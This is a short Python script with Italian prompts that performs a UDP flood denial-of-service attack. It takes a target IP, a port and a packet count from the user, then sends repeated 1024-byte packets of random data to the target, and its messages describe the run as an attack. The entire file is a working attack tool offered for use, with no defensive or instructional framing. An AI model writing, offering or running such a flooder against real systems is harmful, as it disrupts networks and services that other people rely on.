import socket
import random
import ipaddress

def udp_flood(target_ip, target_port, num_packets):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = bytearray(random.getrandbits(8) for _ in range(1024))
        
        for _ in range(num_packets):
            udp_socket.sendto(data, (target_ip, target_port))

        print("Attacco UDP flood completato con successo.")
    except Exception as e:
        print("Si è verificato un errore durante l'attacco UDP flood:", e)
    finally:
        if udp_socket:
            udp_socket.close()

if __name__ == "__main__":
    try:
        target_ip = input("Inserisci l'IP target: ")
        target_port = int(input("Inserisci la porta target: "))
        
        # Verifica validità dell'IP
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Errore: IP non valido.")
            exit(1)

        # Verifica validità della porta
        if not (1 <= target_port <= 65535):
            print("Errore: la porta deve essere compresa tra 1 e 65535.")
            exit(1)

        num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
        if num_packets <= 0:
            print("Errore: il numero di pacchetti deve essere positivo.")
            exit(1)

        udp_flood(target_ip, target_port, num_packets)
    except ValueError:
        print("Errore: assicurati di inserire un numero valido per la porta e il numero di pacchetti.")
